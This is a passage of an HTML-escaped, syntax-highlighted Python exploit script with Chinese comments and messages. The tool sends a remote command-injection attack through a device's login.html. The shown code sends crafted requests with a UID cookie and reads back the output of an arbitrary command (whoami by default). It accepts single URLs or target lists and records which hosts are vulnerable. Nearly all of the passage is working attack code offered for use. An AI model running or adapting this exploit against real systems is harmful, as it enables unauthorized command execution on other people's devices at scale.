&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;Accept-Language&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;login_headers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Accept-Language&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;Accept-Encoding&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;login_headers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Accept-Encoding&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;Connection&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;keep-alive&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;Cookie&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;UID=&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;Upgrade-Insecure-Requests&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;Priority&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;u=0, i&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;verbose&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;print_green&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;[+] 向 &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dir_url&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; 发送GET请求，UID: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;dir_response&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dir_url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dir_headers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;timeout&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;dir_response&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;raise_for_status&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;except&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exceptions&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;RequestException&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;print_red&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;[-] 发送GET请求到 &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dir_url&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; 错误: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;False&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;body&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;dir_response&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;clean_output&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;re&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;split&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;\?xml&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;verbose&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;print_green&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;--- 命令输出 ---&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;clean_output&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;print_green&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;----------------&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;clean_output&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;print_green&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;[+] &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;target_url&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; 存在漏洞!&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;print_red&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;[-] &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;target_url&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; 不存在漏洞&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;bool&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;clean_output&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;parser&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argparse&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ArgumentParser&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;description&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;通过login.html实现命令注入的漏洞利用脚本&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;parser&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add_argument&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;-u&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;--url&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &lt;span class=&#34;n&#34;&gt;help&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;目标URL(如 http://192.168.134.130)。如果未指定-f则必须指定&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;parser&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add_argument&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;-f&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;--file&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &lt;span class=&#34;n&#34;&gt;help&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;包含目标URL列表的文件(每行一个)&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;parser&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add_argument&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;-c&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;--command&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &lt;span class=&#34;n&#34;&gt;help&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;要执行的自定义命令。默认: whoami。如果指定，将自动启用详细输出&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;parser&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add_argument&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;-v&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;--verbose&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;action&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;store_true&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &lt;span class=&#34;n&#34;&gt;help&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;显示完整命令输出(详细模式)。如果使用-c则忽略，因为会自动启用详细模式&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;parser&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add_argument&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;-o&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;--output&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &lt;span class=&#34;n&#34;&gt;help&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;保存存在漏洞URL的文件&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;parser&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add_argument&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;-U&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;--username&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;default&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;anonymous&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &lt;span class=&#34;n&#34;&gt;help&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;漏洞利用中使用的用户名。默认: anonymous&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;args&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;parser&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;parse_args&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;parser&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;必须指定-u/--url或-f/--file&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;command_to_use&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;command&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;command&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;whoami&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;verbose_mode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;True&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;command&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;verbose&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;vulnerable_sites&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;targets&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;
